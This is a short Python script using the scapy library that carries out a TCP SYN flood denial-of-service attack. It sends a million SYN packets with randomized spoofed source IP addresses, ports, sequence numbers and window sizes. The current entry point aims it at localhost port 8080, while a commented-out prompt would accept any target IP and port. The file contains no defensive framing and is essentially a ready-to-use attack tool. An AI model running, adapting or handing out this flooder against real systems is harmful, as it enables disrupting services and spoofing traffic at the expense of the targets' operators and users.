from Tools.scripts.treesync import raw_input
from scapy.all import *
import os
import sys
import random

from scapy.layers.inet import TCP, IP


def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip


def randInt():
    x = random.randint(1000, 9000)
    return x


def SYN_Flood(dstIP, dstPort):
    total = 0
    print("Packets are sending ...")
    for x in range(0, 1000000):
        s_port = randInt()
        s_eq = randInt()
        w_indow = randInt()

        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = dstIP

        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow

        send(IP_Packet / TCP_Packet, verbose=0)
        print('one was sent')
        total += 1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)


def info():
    os.system("clear")
    dstIP = raw_input("\nTarget IP : ")
    dstPort = input("Target Port : ")

    return dstIP, int(dstPort)


def main():
    # dstIP, dstPort = info()
    # SYN_Flood(dstIP, dstPort)
    SYN_Flood('127.0.0.1', 8080)


main()
